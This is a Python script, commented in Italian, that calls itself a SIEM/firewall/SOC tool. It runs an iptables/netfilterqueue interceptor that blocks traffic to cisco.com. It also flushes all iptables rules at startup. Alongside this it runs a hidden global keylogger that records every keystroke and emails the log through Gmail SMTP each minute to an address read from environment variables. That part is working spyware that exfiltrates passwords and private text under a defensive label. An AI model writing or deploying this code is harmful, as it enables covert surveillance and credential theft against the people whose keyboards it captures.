import scapy.all as scapy
import threading
import smtplib
import pynput.keyboard
import os
import re
import netfilterqueue
from dotenv import load_dotenv
import time
from datetime import datetime

# Carica le variabili d'ambiente
load_dotenv()

def send_email(subject, message, attachment_path=None):
    sender_email = os.getenv("SENDER_EMAIL")
    sender_password = os.getenv("SENDER_PASSWORD")
    recipient_email = os.getenv("RECIPIENT_EMAIL")
    
    msg = f"Subject: {subject}\n\n{message}"
    
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, recipient_email, msg.encode("utf-8"))
    
    if attachment_path:
        with open(attachment_path, "r", encoding="utf-8") as file:
            attachment_content = file.read()
        msg_with_attachment = f"Subject: {subject}\n\n{attachment_content}"
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_email, msg_with_attachment.encode("utf-8"))

# Keylogger
keylog_buffer = []
keylog_lock = threading.Lock()

def on_key_press(key):
    try:
        key_mapping = {
            "Key.space": " ",
            "Key.enter": "\n",
            "Key.tab": "\t",
            "Key.backspace": "[BACKSPACE]",
            "Key.shift": "",
            "Key.shift_r": "",
            "Key.ctrl": "[CTRL]",
            "Key.ctrl_r": "[CTRL]",
            "Key.alt": "[ALT]",
            "Key.alt_r": "[ALT]"
        }
        key_str = key_mapping.get(str(key), str(key).replace("'", ""))
        
        with keylog_lock:
            keylog_buffer.append(key_str)
    except Exception as e:
        print(f"Errore keylogger: {e}")

keyboard_listener = pynput.keyboard.Listener(on_press=on_key_press)

def start_keylogger():
    with keyboard_listener:
        keyboard_listener.join()

detected_sites = []

# Rilevamento accessi ai siti non autorizzati
def packet_callback(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.TCP):
        if scapy_packet.haslayer(scapy.Raw):
            payload = scapy_packet[scapy.Raw].load.decode(errors="ignore")
            
            if "cisco.com" in payload:
                current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                ip_src = scapy_packet[scapy.IP].src
                print(f"[BLOCKED] Accesso a sito malevolo bloccato! {current_time} - IP: {ip_src}")
                
                detected_sites.append(f"{current_time} - {ip_src} tentativo di accesso a cisco.com")
                packet.drop()
                return
        
    packet.accept()

queue = netfilterqueue.NetfilterQueue()

def start_packet_interceptor():
    queue.bind(0, packet_callback)
    queue.run()

# Invia il report ogni minuto
def send_report():
    while True:
        time.sleep(60)
        report_message = "Report SIEM:\n\nTentativi di accesso a siti non autorizzati:\n" + "\n".join(detected_sites)
        send_email("Report SIEM", report_message)
        detected_sites.clear()

def send_keylog():
    while True:
        time.sleep(60)
        with keylog_lock:
            keylog_content = "".join(keylog_buffer)
            keylog_buffer.clear()
        
        if keylog_content:  # Invia solo se ci sono tasti registrati
            with open("keylog.txt", "w", encoding="utf-8") as log_file:
                log_file.write(keylog_content)
            
            send_email("Keylogger Report", "", "keylog.txt")


if __name__ == "__main__":
    os.system("iptables --flush")
    os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
    os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")

    print("[+] SIEM, FIREWALL, SOC ecc... IN ESECUZIONE")
    threading.Thread(target=scapy.sniff, kwargs={"prn": packet_callback, "store": False}).start()
    threading.Thread(target=start_keylogger).start()    #thread che si occupa del keylogger
    threading.Thread(target=start_packet_interceptor).start()   #thread che si occupa dell'intercettazione dei pacchetti
    threading.Thread(target=send_report, daemon=True).start()   #thread che si occupa dei report (acessi bloccati a sito non autorizzato)
    threading.Thread(target=send_keylog, daemon=True).start()   #thread che si occupa dei report (keylogger)
